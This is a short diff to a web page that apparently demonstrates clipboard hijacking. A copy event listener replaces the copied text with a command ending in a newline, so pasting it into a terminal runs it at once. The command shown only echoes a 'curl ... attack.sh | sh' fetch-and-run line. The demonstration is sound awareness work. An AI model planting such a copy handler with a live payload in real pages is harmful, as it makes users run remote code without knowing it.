@@ -22,8 +22,10 @@
 		It even has a helpfull new line at the end, so you dont have to press enter!
 	</p>
 	<script>
+		//the exploit
 		document.getElementById('copy-me').addEventListener('copy', function(e) {
 	    	e.clipboardData.setData('text/plain', 'echo "this could have been [curl https://10maurycy10.github.io/attack.sh | sh]"\n\r\n');
+	    	//\r\n for windows?
 	    	e.preventDefault();
 		});
 	</script>
